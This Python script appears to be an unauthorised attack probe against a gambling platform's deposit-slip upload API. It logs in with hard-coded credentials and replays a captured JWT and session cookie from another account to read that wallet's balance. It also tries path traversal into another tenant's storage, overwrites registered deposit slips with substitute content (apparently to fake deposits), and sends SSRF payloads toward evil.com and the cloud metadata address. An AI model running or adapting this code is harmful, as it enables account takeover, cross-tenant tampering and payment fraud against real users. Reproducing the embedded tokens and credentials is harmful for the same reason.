#!/usr/bin/env python3
"""probe_signurl.py — Research GCS signed URL hash/MD5 security on upload-slip flow.

   KEY OBSERVATIONS from we88c capture:
   - Signed URL has NO Content-MD5 parameter → any content can be uploaded
   - upload-slip size=283609 but actual GCS content-length=680284 → no hash verification
   - Filename param → GCS object path: {TID}/deposit_slip/{filename}

   Tests:
   1. Path traversal via filename to escape deposit_slip/ dir
   2. Upload wrong content-type (JPEG as PNG)
   3. Can we get signed URL for same filename twice? (overwrite attack)
   4. Can we supply Content-MD5 header to see if platform verifies it post-upload
   5. Cross-tenant path access via filename traversal
"""
import base64, hashlib, json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
TID_WE = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
MGAPI_WE = f"https://{TID_WE}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

JWT_WE88 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNjZkNzRlMy1kNmNhLTQ3ZWItYjlhYy1iOGM0NTU3NGJhZDQiLCJjZiI6IjEwNjBlZGM0OTg3ZWU3ODJhMDQ5YTdjYWJhZTEwNjg3IiwiaXNfbm90X2NvbXBsZXRlIjpmYWxzZSwiZXhwIjoxNzkxNTMxNjY1LCJpYXQiOjE3OTE1MTcyNjV9.XIeAiJyq3_VF_k3WcSspqFqxpWHW7OzH-E4o1TMLX-Y"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}
HDR_WE = {"Authorization": f"Bearer {JWT_WE88}", "template": "vn",
          "Content-Type": "application/json"}

# Minimal known-hash PNG payload
MINIMAL_PNG = (
    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
    b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
    b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
)
PNG_MD5_B64 = base64.b64encode(hashlib.md5(MINIMAL_PNG).digest()).decode()
print(f"Minimal PNG MD5 (base64): {PNG_MD5_B64}")
print(f"Minimal PNG MD5 (hex): {hashlib.md5(MINIMAL_PNG).hexdigest()}")

# ── Test 1: Examine raw sign-url response structure ───────────────────────────
print("\n=== 1. Examine sign-url response (look for hash/MD5 constraints) ===")
sr1 = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                    json={"filename": "test_hash.png", "content_type": "image/png", "size": 1024},
                    timeout=15)
print(f"  HTTP {sr1.status_code}")
if sr1.ok:
    body1 = sr1.json()
    print(f"  Keys: {list(body1.keys())}")
    url1 = body1.get("urlUpload", "")
    print(f"  urlUpload params: {url1.split('?', 1)[1][:300] if '?' in url1 else 'none'}")
    # Check for Content-MD5, x-goog-content-sha256, or hash in the URL
    for key in ["Content-MD5", "x-goog-content-sha256", "MD5", "Hash", "Checksum"]:
        if key.lower() in url1.lower():
            print(f"  [!] Found {key} in URL!")
    print(f"  Full signed URL (first 200): {url1[:200]}")

# ── Test 2: Path traversal in filename ───────────────────────────────────────
print("\n=== 2. Path traversal via filename ===")
traversal_names = [
    "../admin_slip.png",
    "../../admin.png",
    f"../../../{TID_WE}/deposit_slip/injected.png",  # write to another tenant
    "test%2F..%2Fadmin.png",  # URL-encoded
    "test/../../../etc/passwd",
    "normal.png%00.jpg",  # null byte
]
for fname in traversal_names:
    sr = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                       json={"filename": fname, "content_type": "image/png", "size": 100},
                       timeout=10)
    if sr.ok:
        url = sr.json().get("urlUpload", "")
        # Extract the GCS path from the URL
        path_part = url.split("?")[0].replace("https://storage.googleapis.com/pcdn.i-gamingplatform.com/", "")
        print(f"  [{fname[:30]}] → path: {path_part}")
    else:
        print(f"  [{fname[:30]}] → HTTP {sr.status_code}: {sr.text[:80]}")
    time.sleep(0.5)

# ── Test 3: Upload with Content-MD5 header (match vs mismatch) ───────────────
print("\n=== 3. Content-MD5 verification test ===")
sr3 = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                    json={"filename": "md5test.png", "content_type": "image/png",
                          "size": len(MINIMAL_PNG)},
                    timeout=15)
if sr3.ok:
    url3 = sr3.json().get("urlUpload", "")
    fn3 = sr3.json().get("filename", "")

    # 3a: Correct MD5
    r3a = requests.put(url3,
                       headers={"Content-Type": "image/png",
                                "Content-MD5": PNG_MD5_B64},
                       data=MINIMAL_PNG, timeout=20)
    print(f"  PUT with CORRECT MD5 ({PNG_MD5_B64}): {r3a.status_code}")
    print(f"    x-goog-hash: {r3a.headers.get('x-goog-hash', 'none')}")

    # 3b: Wrong MD5
    wrong_md5 = base64.b64encode(b'\x00' * 16).decode()
    r3b = requests.put(url3,
                       headers={"Content-Type": "image/png",
                                "Content-MD5": wrong_md5},
                       data=MINIMAL_PNG, timeout=20)
    print(f"  PUT with WRONG MD5 ({wrong_md5}): {r3b.status_code}: {r3b.text[:100]}")

# ── Test 4: Overwrite existing slip with different content ────────────────────
print("\n=== 4. Sign URL reuse / overwrite after deposit queued ===")
sr4 = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                    json={"filename": "overwrite_test.png", "content_type": "image/png",
                          "size": len(MINIMAL_PNG)},
                    timeout=15)
if sr4.ok:
    url4 = sr4.json().get("urlUpload", "")
    fn4  = sr4.json().get("filename", "")

    # First upload: minimal PNG (tiny)
    r4a = requests.put(url4, headers={"Content-Type": "image/png"},
                       data=MINIMAL_PNG, timeout=20)
    print(f"  Initial upload (minimal PNG): {r4a.status_code}")
    print(f"    stored-length: {r4a.headers.get('x-goog-stored-content-length', '?')}")
    print(f"    md5: {r4a.headers.get('x-goog-hash', '?')}")

    # Register the slip
    usl4 = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                         json={"filename": fn4, "fileOriginalName": "overwrite_test.png",
                               "contentType": "image/png", "size": len(MINIMAL_PNG)},
                         timeout=15)
    print(f"  upload-slip: {usl4.status_code}")

    # Now overwrite with "large" content (fake high-value slip)
    fake_large = MINIMAL_PNG * 100  # just bigger, not a real slip
    r4b = requests.put(url4, headers={"Content-Type": "image/png"},
                       data=fake_large, timeout=20)
    print(f"  Overwrite PUT (100x larger): {r4b.status_code}: {r4b.text[:100]}")

# ── Test 5: Check if we88c JWT still works (platform may skip expiry check) ──
print("\n=== 5. we88c JWT expiry check ===")
rw = requests.get(f"{MGAPI_WE}/mb/wallet", headers=HDR_WE, timeout=10)
print(f"  GET we88c wallet with 'expired' JWT: HTTP {rw.status_code}: {rw.text[:200]}")
if rw.ok:
    balance = rw.json().get("data", [{}])[0].get("balance", "?")
    print(f"  [!!!] JWT still works! balance={balance}")
    # Try a fresh deposit with same expired JWT
    sr_we = requests.post(f"{MGAPI_WE}/mb/sign-url-upload-slip", headers=HDR_WE,
                          json={"filename": "inflate_test.png", "content_type": "image/png",
                                "size": 1024},
                          timeout=15)
    print(f"  sign-url on we88c: {sr_we.status_code}: {sr_we.text[:200] if not sr_we.ok else 'OK'}")

# ── Test 6: Filename injection (SSRF/path manipulation in upload-slip url) ────
print("\n=== 6. upload-slip with external URL in filename ===")
external_url_payloads = [
    "https://evil.com/slip.png",
    "http://169.254.169.254/slip.png",
    "//evil.com/slip.png",
]
for payload in external_url_payloads:
    r6 = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                       json={"filename": payload, "fileOriginalName": "slip.png",
                             "contentType": "image/png", "size": 1024},
                       timeout=10)
    if r6.status_code not in (400, 404):
        print(f"  [!!!] upload-slip filename={payload[:40]}: HTTP {r6.status_code}: {r6.text[:150]}")
    else:
        print(f"  upload-slip filename={payload[:40]}: {r6.status_code}")

print("\n=== SUMMARY ===")
print("Key findings: see output above")
print("Watch for: path traversal success, wrong MD5 accepted, JWT not expiry-checked")
